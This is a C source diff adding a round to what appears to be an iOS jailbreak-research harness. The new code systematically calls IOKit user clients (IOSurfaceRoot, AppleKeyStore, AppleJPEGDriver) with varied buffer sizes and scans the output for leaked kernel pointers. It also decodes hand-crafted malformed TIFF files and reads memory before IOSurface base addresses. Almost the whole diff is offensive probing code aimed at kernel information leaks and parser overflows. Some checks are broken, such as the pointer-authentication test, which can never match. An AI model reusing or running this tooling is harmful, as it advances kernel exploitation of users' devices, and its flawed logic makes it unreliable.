@@ -8638,6 +8638,543 @@ r326_done:
     fflush(stdout);
 }
 
+/* r328: HENkaku-style uninitialized kernel buffer probe
+   PS Vita HENkaku: sceIoDevctl copied uninitialized kernel stack to user when outlen < 0x400
+   PSP TIFF: image parser overflow in libtiff
+   Xbox King Kong: shader output wrote to arbitrary memory via shared GPU buffers
+   3DS sighax: parser validation flaw in signature verification
+
+   Strategy: Call IOKit struct methods with VARIED output buffer sizes.
+   The kernel may stack-allocate a fixed buffer but copy less than it allocated,
+   leaving uninitialized stack data (including kernel pointers) in the output.
+   Also probe ImageIO with malformed TIFF and Metal shared memory regions. */
+
+static void r328_probe(void) {
+    rlog("\n=== r328: HENkaku Uninit Buffer + TIFF Parser + GPU Shared Mem ===\n");
+    rlog("  Strategy: Varied struct output sizes to catch uninit kernel stack leaks\n");
+    rlog("  Inspiration: PS Vita HENkaku, PSP TIFF, Xbox King Kong, 3DS sighax\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: IOSurfaceRoot struct methods with varied output sizes ---- */
+    /* HENkaku key insight: kernel stack buffers may not be fully zeroed.
+       If we request output of size X but the kernel only fills Y < X bytes,
+       the remaining X-Y bytes may contain kernel stack residue (pointers). */
+    rlog("--- Part 1: IOSurfaceRoot uninit buffer probe (HENkaku pattern) ---\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (!svc) { rlog("  IOSurfaceRoot not found\n"); goto p1_done; }
+
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        if (kr != 0) { rlog("  open failed: 0x%x\n", kr); IOObjectRelease(svc); goto p1_done; }
+
+        rlog("  conn=0x%x\n", conn);
+
+        /* Test varied output sizes for each selector.
+           The HENkaku bug was that the kernel allocated ~0x400 on stack but
+           only partially initialized it. We try sizes from 1 to 4096. */
+        size_t test_sizes[] = {1, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096};
+        int nsizes = sizeof(test_sizes) / sizeof(test_sizes[0]);
+
+        for (uint32_t sel = 0; sel < 40; sel++) {
+            int any_success = 0;
+            for (int si = 0; si < nsizes; si++) {
+                size_t outsz = test_sizes[si];
+                char *outbuf = (char *)calloc(1, outsz + 16);
+                if (!outbuf) continue;
+
+                /* Pre-fill with sentinel pattern 0xDE to detect partial writes */
+                memset(outbuf, 0xDE, outsz);
+
+                size_t actual_outsz = outsz;
+                kr = IOConnectCallStructMethod(conn, sel, NULL, 0, outbuf, &actual_outsz);
+
+                if (kr == 0 || (kr != 0xe00002bc && kr != 0xe00002c2 && actual_outsz > 0)) {
+                    any_success = 1;
+                    /* Check for partial initialization — sentinel bytes remaining */
+                    int sentinel_bytes = 0;
+                    int first_sentinel = -1;
+                    for (size_t j = 0; j < actual_outsz; j++) {
+                        if ((uint8_t)outbuf[j] == 0xDE) {
+                            sentinel_bytes++;
+                            if (first_sentinel < 0) first_sentinel = (int)j;
+                        }
+                    }
+
+                    /* Scan for kernel pointer patterns */
+                    int kptrs = 0;
+                    for (size_t j = 0; j + 8 <= actual_outsz; j += 4) {
+                        uint64_t v;
+                        memcpy(&v, outbuf + j, 8);
+                        /* Kernel range: 0xfffffff000000000+ */
+                        if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                            rlog("  !!! KPTR sel=%u sz=%zu off=%zu: 0x%llx (kr=0x%x) !!!\n",
+                                 sel, outsz, j, (unsigned long long)v, kr);
+                            kptrs++;
+                        }
+                        /* PAC-signed pointers: top bits set but different pattern */
+                        if ((v >> 48) != 0 && (v >> 48) != 0xFFFF &&
+                            (v & 0x0000FFFFFFFFFFFFULL) > 0xfffffff000000000ULL) {
+                            rlog("  !!! PAC-KPTR sel=%u sz=%zu off=%zu: 0x%llx !!!\n",
+                                 sel, outsz, j, (unsigned long long)v);
+                            kptrs++;
+                        }
+                    }
+
+                    if (kptrs > 0 || sentinel_bytes > (int)actual_outsz / 4) {
+                        rlog("  sel=%u reqsz=%zu actsz=%zu kr=0x%x sentinels=%d/%zu kptrs=%d\n",
+                             sel, outsz, actual_outsz, kr, sentinel_bytes, actual_outsz, kptrs);
+                        /* Hexdump first 64 bytes for analysis */
+                        rlog("    hex: ");
+                        for (size_t j = 0; j < actual_outsz && j < 64; j++) {
+                            rlog("%02x", (uint8_t)outbuf[j]);
+                            if ((j & 7) == 7) rlog(" ");
+                        }
+                        rlog("\n");
+                    }
+                }
+                free(outbuf);
+            }
+            if (any_success) {
+                rlog("  sel=%u: has non-denied responses\n", sel);
+            }
+        }
+
+        /* Also try with non-zero input structs — the kernel may take different
+           code paths depending on input data, initializing different amounts */
+        rlog("  Trying with crafted input structs...\n");
+        for (uint32_t sel = 0; sel < 20; sel++) {
+            /* Input: an IOSurface ID (try 0, 1, common IDs) */
+            uint32_t input_ids[] = {0, 1, 100, 0xFFFFFFFF};
+            for (int ii = 0; ii < 4; ii++) {
+                char inbuf[64];
+                memset(inbuf, 0, sizeof(inbuf));
+                memcpy(inbuf, &input_ids[ii], 4);
+
+                char outbuf[1024];
+                memset(outbuf, 0xDE, sizeof(outbuf));
+                size_t outsz = sizeof(outbuf);
+
+                kern_return_t kr2 = IOConnectCallStructMethod(conn, sel,
+                    inbuf, sizeof(inbuf), outbuf, &outsz);
+
+                if (kr2 == 0 && outsz > 0) {
+                    /* Scan for kernel pointers */
+                    for (size_t j = 0; j + 8 <= outsz; j += 4) {
+                        uint64_t v;
+                        memcpy(&v, outbuf + j, 8);
+                        if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                            rlog("  !!! KPTR sel=%u in_id=%u off=%zu: 0x%llx !!!\n",
+                                 sel, input_ids[ii], j, (unsigned long long)v);
+                        }
+                    }
+                    /* Check for sentinel residue */
+                    int sentinels = 0;
+                    for (size_t j = 0; j < outsz; j++) {
+                        if ((uint8_t)outbuf[j] == 0xDE) sentinels++;
+                    }
+                    if (sentinels > 0) {
+                        rlog("  sel=%u in_id=%u outsz=%zu sentinels=%d (PARTIAL INIT)\n",
+                             sel, input_ids[ii], outsz, sentinels);
+                    }
+                }
+            }
+        }
+
+        IOServiceClose(conn);
+        IOObjectRelease(svc);
+    }
+    p1_done:
+    fflush(stdout);
+
+    /* ---- Part 2: AppleKeyStore uninit buffer probe ---- */
+    rlog("\n--- Part 2: AppleKeyStore uninit buffer probe ---\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        if (!svc) { rlog("  not found\n"); goto p2_done; }
+
+        for (uint32_t type = 0; type < 5; type++) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
+            if (kr != 0) continue;
+
+            rlog("  type=%u conn=0x%x\n", type, conn);
+
+            /* HENkaku pattern: try very small output sizes that might expose
+               uninitialized portions of kernel stack buffers */
+            for (uint32_t sel = 0; sel < 50; sel++) {
+                /* Try a range of output sizes, especially small ones */
+                size_t small_sizes[] = {8, 16, 32, 48, 64, 96, 128, 192, 256, 384, 512, 768, 1024};
+                for (int si = 0; si < 13; si++) {
+                    size_t outsz = small_sizes[si];
+                    char *outbuf = (char *)calloc(1, outsz + 8);
+                    if (!outbuf) continue;
+                    memset(outbuf, 0xDE, outsz);
+
+                    size_t actual = outsz;
+                    kr = IOConnectCallStructMethod(conn, sel, NULL, 0, outbuf, &actual);
+
+                    if (kr == 0 && actual > 0) {
+                        /* Scan for kernel pointers */
+                        for (size_t j = 0; j + 8 <= actual; j += 4) {
+                            uint64_t v;
+                            memcpy(&v, outbuf + j, 8);
+                            if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                                rlog("  !!! AKS KPTR type=%u sel=%u reqsz=%zu off=%zu: 0x%llx !!!\n",
+                                     type, sel, outsz, j, (unsigned long long)v);
+                            }
+                        }
+                        /* Count uninitialized sentinel bytes */
+                        int sentinels = 0;
+                        for (size_t j = 0; j < actual; j++) {
+                            if ((uint8_t)outbuf[j] == 0xDE) sentinels++;
+                        }
+                        if (sentinels > 0) {
+                            rlog("  AKS type=%u sel=%u sz=%zu/%zu sentinels=%d\n",
+                                 type, sel, actual, outsz, sentinels);
+                        }
+                    }
+                    free(outbuf);
+                }
+            }
+            IOServiceClose(conn);
+        }
+        IOObjectRelease(svc);
+    }
+    p2_done:
+    fflush(stdout);
+
+    /* ---- Part 3: AppleJPEGDriver uninit buffer probe ---- */
+    rlog("\n--- Part 3: AppleJPEGDriver uninit buffer probe ---\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleJPEGDriver"));
+        if (!svc) { rlog("  not found\n"); goto p3_done; }
+
+        for (uint32_t type = 0; type < 5; type++) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
+            if (kr != 0) continue;
+
+            rlog("  type=%u conn=0x%x\n", type, conn);
+
+            for (uint32_t sel = 0; sel < 20; sel++) {
+                /* Try struct method with varied output sizes */
+                size_t sizes[] = {64, 128, 256, 512, 1024, 2048, 4096};
+                for (int si = 0; si < 7; si++) {
+                    size_t outsz = sizes[si];
+                    char *outbuf = (char *)calloc(1, outsz);
+                    if (!outbuf) continue;
+                    memset(outbuf, 0xDE, outsz);
+
+                    size_t actual = outsz;
+                    kr = IOConnectCallStructMethod(conn, sel, NULL, 0, outbuf, &actual);
+
+                    if (kr == 0 && actual > 0) {
+                        for (size_t j = 0; j + 8 <= actual; j += 4) {
+                            uint64_t v;
+                            memcpy(&v, outbuf + j, 8);
+                            if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                                rlog("  !!! JPEG KPTR type=%u sel=%u sz=%zu off=%zu: 0x%llx !!!\n",
+                                     type, sel, outsz, j, (unsigned long long)v);
+                            }
+                        }
+                    }
+                    free(outbuf);
+                }
+
+                /* Also try IOConnectCallMethod with both scalar and struct output */
+                uint64_t scOut[16] = {0};
+                uint32_t scOutCnt = 16;
+                char mOutBuf[2048];
+                memset(mOutBuf, 0xDE, sizeof(mOutBuf));
+                size_t mOutSz = sizeof(mOutBuf);
+
+                kr = IOConnectCallMethod(conn, sel,
+                    NULL, 0,    /* scalar in */
+                    NULL, 0,    /* struct in */
+                    scOut, &scOutCnt,
+                    mOutBuf, &mOutSz);
+
+                if (kr == 0) {
+                    /* Check scalar outputs */
+                    for (uint32_t si2 = 0; si2 < scOutCnt; si2++) {
+                        if (scOut[si2] > 0xfffffff000000000ULL &&
+                            scOut[si2] < 0xffffffffffffffffULL) {
+                            rlog("  !!! JPEG SCALAR KPTR sel=%u idx=%u: 0x%llx !!!\n",
+                                 sel, si2, scOut[si2]);
+                        }
+                    }
+                    /* Check struct output */
+                    for (size_t j = 0; j + 8 <= mOutSz; j += 4) {
+                        uint64_t v;
+                        memcpy(&v, mOutBuf + j, 8);
+                        if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                            rlog("  !!! JPEG METHOD KPTR sel=%u off=%zu: 0x%llx !!!\n",
+                                 sel, j, (unsigned long long)v);
+                        }
+                    }
+                }
+            }
+            IOServiceClose(conn);
+        }
+        IOObjectRelease(svc);
+    }
+    p3_done:
+    fflush(stdout);
+
+    /* ---- Part 4: ImageIO TIFF parser probe (PSP TIFF pattern) ---- */
+    /* PSP TIFF exploit: malformed TIFF triggered buffer overflow in libtiff.
+       iOS uses ImageIO which wraps libtiff for TIFF decoding.
+       Craft malformed TIFF headers and decode via CGImageSource. */
+    rlog("\n--- Part 4: ImageIO TIFF parser probe (PSP TIFF pattern) ---\n");
+    fflush(stdout);
+    {
+        /* Minimal TIFF header with malformed fields */
+        /* TIFF: II (little-endian), magic 42, offset to IFD */
+        uint8_t tiff_hdr[] = {
+            'I', 'I',              /* byte order: little-endian */
+            42, 0,                 /* magic */
+            8, 0, 0, 0,           /* offset to first IFD (immediately after header) */
+            /* IFD: 3 entries */
+            3, 0,                  /* entry count */
+            /* Entry 0: ImageWidth (tag 256) = LONG, count 1, value 0xFFFFFFFF */
+            0x00, 0x01,  0x04, 0x00,  0x01, 0x00, 0x00, 0x00,  0xFF, 0xFF, 0xFF, 0xFF,
+            /* Entry 1: ImageLength (tag 257) = LONG, count 1, value 0xFFFFFFFF */
+            0x01, 0x01,  0x04, 0x00,  0x01, 0x00, 0x00, 0x00,  0xFF, 0xFF, 0xFF, 0xFF,
+            /* Entry 2: BitsPerSample (tag 258) = SHORT, count 1, value 0xFFFF */
+            0x02, 0x01,  0x03, 0x00,  0x01, 0x00, 0x00, 0x00,  0xFF, 0xFF, 0x00, 0x00,
+            /* Next IFD offset = 0 (end) */
+            0x00, 0x00, 0x00, 0x00
+        };
+
+        CFDataRef tiffData = CFDataCreate(NULL, tiff_hdr, sizeof(tiff_hdr));
+        CGImageSourceRef src = CGImageSourceCreateWithData(tiffData, NULL);
+        if (src) {
+            CGImageSourceStatus st = CGImageSourceGetStatus(src);
+            size_t cnt = CGImageSourceGetCount(src);
+            rlog("  Malformed TIFF: status=%d count=%zu\n", (int)st, cnt);
+
+            if (cnt > 0) {
+                CGImageRef img = CGImageSourceCreateImageAtIndex(src, 0, NULL);
+                if (img) {
+                    rlog("  !!! Malformed TIFF decoded: %zux%zu bpc=%zu !!!\n",
+                         CGImageGetWidth(img), CGImageGetHeight(img),
+                         CGImageGetBitsPerComponent(img));
+                    CGImageRelease(img);
+                }
+            }
+
+            /* Get properties — these go through the parser */
+            CFDictionaryRef props = CGImageSourceCopyPropertiesAtIndex(src, 0, NULL);
+            if (props) {
+                CFIndex pcnt = CFDictionaryGetCount(props);
+                rlog("  TIFF properties: %ld keys\n", (long)pcnt);
+                CFRelease(props);
+            }
+            CFRelease(src);
+        } else {
+            rlog("  CGImageSourceCreateWithData: NULL (rejected)\n");
+        }
+        CFRelease(tiffData);
+
+        /* Try TIFF with extremely large BitsPerSample (CVE-2005-1544 pattern) */
+        uint8_t tiff2[] = {
+            'I', 'I', 42, 0, 8, 0, 0, 0,
+            2, 0,
+            /* ImageWidth = 1 */
+            0x00, 0x01,  0x04, 0x00,  0x01, 0x00, 0x00, 0x00,  0x01, 0x00, 0x00, 0x00,
+            /* BitsPerSample = 65535 (overflow trigger) */
+            0x02, 0x01,  0x03, 0x00,  0x01, 0x00, 0x00, 0x00,  0xFF, 0xFF, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00
+        };
+        CFDataRef t2d = CFDataCreate(NULL, tiff2, sizeof(tiff2));
+        CGImageSourceRef s2 = CGImageSourceCreateWithData(t2d, NULL);
+        if (s2) {
+            rlog("  TIFF2 (huge BitsPerSample): status=%d count=%zu\n",
+                 (int)CGImageSourceGetStatus(s2), CGImageSourceGetCount(s2));
+            CFRelease(s2);
+        }
+        CFRelease(t2d);
+
+        /* Try TIFF with StripOffsets pointing outside data */
+        uint8_t tiff3[] = {
+            'I', 'I', 42, 0, 8, 0, 0, 0,
+            4, 0,
+            /* ImageWidth = 4 */
+            0x00, 0x01,  0x04, 0x00,  0x01, 0x00, 0x00, 0x00,  0x04, 0x00, 0x00, 0x00,
+            /* ImageLength = 4 */
+            0x01, 0x01,  0x04, 0x00,  0x01, 0x00, 0x00, 0x00,  0x04, 0x00, 0x00, 0x00,
+            /* BitsPerSample = 8 */
+            0x02, 0x01,  0x03, 0x00,  0x01, 0x00, 0x00, 0x00,  0x08, 0x00, 0x00, 0x00,
+            /* StripOffsets = 0xDEAD0000 (way outside data) */
+            0x11, 0x01,  0x04, 0x00,  0x01, 0x00, 0x00, 0x00,  0x00, 0x00, 0xAD, 0xDE,
+            0x00, 0x00, 0x00, 0x00
+        };
+        CFDataRef t3d = CFDataCreate(NULL, tiff3, sizeof(tiff3));
+        CGImageSourceRef s3 = CGImageSourceCreateWithData(t3d, NULL);
+        if (s3) {
+            rlog("  TIFF3 (OOB StripOffsets): status=%d count=%zu\n",
+                 (int)CGImageSourceGetStatus(s3), CGImageSourceGetCount(s3));
+            if (CGImageSourceGetCount(s3) > 0) {
+                CGImageRef img3 = CGImageSourceCreateImageAtIndex(s3, 0, NULL);
+                if (img3) {
+                    rlog("  !!! OOB StripOffsets TIFF decoded !!!\n");
+                    CGImageRelease(img3);
+                }
+            }
+            CFRelease(s3);
+        }
+        CFRelease(t3d);
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: IOConnectCallMethod with mixed scalar+struct outputs ---- */
+    /* 3DS sighax pattern: parser validation flaw. IOKit methods that return
+       both scalar and struct data might not validate the struct portion. */
+    rlog("\n--- Part 5: IOKit mixed scalar+struct output probe ---\n");
+    fflush(stdout);
+    {
+        /* Try IOSurfaceRoot with IOConnectCallMethod (not just struct) */
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (svc) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            if (kr == 0) {
+                for (uint32_t sel = 0; sel < 30; sel++) {
+                    /* Provide both scalar and struct output buffers */
+                    uint64_t scIn[4] = {0};
+                    uint64_t scOut[16] = {0};
+                    uint32_t scOutCnt = 16;
+                    char structOut[4096];
+                    memset(structOut, 0xDE, sizeof(structOut));
+                    size_t structOutSz = sizeof(structOut);
+
+                    kr = IOConnectCallMethod(conn, sel,
+                        scIn, 1, NULL, 0,
+                        scOut, &scOutCnt, structOut, &structOutSz);
+
+                    if (kr == 0 || (kr != 0xe00002bc && kr != 0xe00002c2)) {
+                        int found = 0;
+                        /* Check scalar outputs for kernel addresses */
+                        for (uint32_t i = 0; i < scOutCnt; i++) {
+                            if (scOut[i] > 0xfffffff000000000ULL &&
+                                scOut[i] < 0xffffffffffffffffULL) {
+                                rlog("  !!! MIXED SCALAR KPTR sel=%u idx=%u: 0x%llx !!!\n",
+                                     sel, i, scOut[i]);
+                                found++;
+                            }
+                        }
+                        /* Check struct output */
+                        for (size_t j = 0; j + 8 <= structOutSz; j += 4) {
+                            uint64_t v;
+                            memcpy(&v, structOut + j, 8);
+                            if (v > 0xfffffff000000000ULL && v < 0xffffffffffffffffULL) {
+                                rlog("  !!! MIXED STRUCT KPTR sel=%u off=%zu: 0x%llx !!!\n",
+                                     sel, j, (unsigned long long)v);
+                                found++;
+                            }
+                        }
+                        if (found > 0) {
+                            rlog("  sel=%u kr=0x%x scCnt=%u structSz=%zu FOUND %d\n",
+                                 sel, kr, scOutCnt, structOutSz, found);
+                        }
+                    }
+                }
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 6: IOSurface MachPort round-trip uninit probe ---- */
+    /* When IOSurface is transferred via Mach port, the receiving side may
+       expose header data that wasn't fully sanitized */
+    rlog("\n--- Part 6: IOSurface MachPort transfer uninit probe ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        typedef mach_port_t (*IOSurfaceCreateMachPort_fn)(void*);
+        typedef void* (*IOSurfaceLookupFromMachPort_fn)(mach_port_t);
+        IOSurfaceCreateMachPort_fn mpFn = (IOSurfaceCreateMachPort_fn)
+            dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+        IOSurfaceLookupFromMachPort_fn luFn = (IOSurfaceLookupFromMachPort_fn)
+            dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
+
+        if (cFn && mpFn && luFn) {
+            /* Create surfaces of various sizes and check base address region */
+            size_t allocs[] = {4096, 16384, 65536, 262144};
+            for (int ai = 0; ai < 4; ai++) {
+                int w = 16, h = 16, bpr = 64, pf = 0x42475241;
+                int as = (int)allocs[ai];
+                CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef aV = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                const void *keys[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                    CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceAllocSize"),
+                    CFSTR("IOSurfacePixelFormat")};
+                const void *vals[] = {wV, hV, bV, aV, pV};
+                CFDictionaryRef p = CFDictionaryCreate(NULL, keys, vals, 5,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                void *surf = cFn(p);
+                if (surf) {
+                    mach_port_t mp = mpFn(surf);
+                    void *surf2 = luFn(mp);
+                    if (surf2) {
+                        IOSurfaceLock(surf2, kIOSurfaceLockReadOnly, NULL);
+                        void *base = IOSurfaceGetBaseAddress(surf2);
+                        size_t actual_alloc = IOSurfaceGetAllocSize(surf2);
+
+                        /* Scan bytes BEFORE the base address (header region)
+                           using vm_read — this may contain kernel metadata */
+                        mach_vm_address_t addr = (mach_vm_address_t)base;
+                        if (addr > 0x1000) {
+                            vm_offset_t data = 0;
+                            mach_msg_type_number_t dataCnt = 0;
+                            kern_return_t vkr = vm_read(mach_task_self(),
+                                (vm_address_t)(addr - 0x1000), 0x1000,
+                                &data, &dataCnt);
+                            if (vkr == 0 && dataCnt > 0) {
+                                rlog("  surf alloc=%d: pre-base 0x1000 bytes readable\n", as);
+                                /* Scan for kernel addresses */
+                                uint64_t *dp = (uint64_t *)(uintptr_t)data;
+                                for (size_t j = 0; j < dataCnt / 8; j++) {
+                                    if (dp[j] > 0xfffffff000000000ULL &&
+                                        dp[j] < 0xffffffffffffffffULL) {
+                                        rlog("  !!! PRE-BASE KPTR alloc=%d off=-%zu: 0x%llx !!!\n",
+                                             as, 0x1000 - j * 8, dp[j]);
+                                    }
+                                }
+                                vm_deallocate(mach_task_self(), data, dataCnt);
+                            }
+                        }
+                        IOSurfaceUnlock(surf2, kIOSurfaceLockReadOnly, NULL);
+                    }
+                    if (mp != MACH_PORT_NULL)
+                        mach_port_deallocate(mach_task_self(), mp);
+                    CFRelease(surf);
+                }
+                CFRelease(p);
+                CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(aV); CFRelease(pV);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r328 complete ===\n");
+    fflush(stdout);
+}
+
 /* r327: Lockdown Mode reconnaissance — inspired by console exploit transitions
    PSP swap-sploit: TOCTOU during security state change
    Xbox 360 RGH: rapid state transitions to skip checks
@@ -39860,6 +40397,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 328) {
+            rlog("*** rounds=328: HENkaku Uninit Buffer + TIFF Parser + GPU Shared ***\n");
+            rlog("  r327: LDM recon + console exploit patterns.\n");
+            rlog("  Probe: IOKit uninit buffers, TIFF parser, mixed scalar+struct, pre-base scan.\n\n");
+            r328_probe();
             goto done;
         }
         if (rounds == 327) {
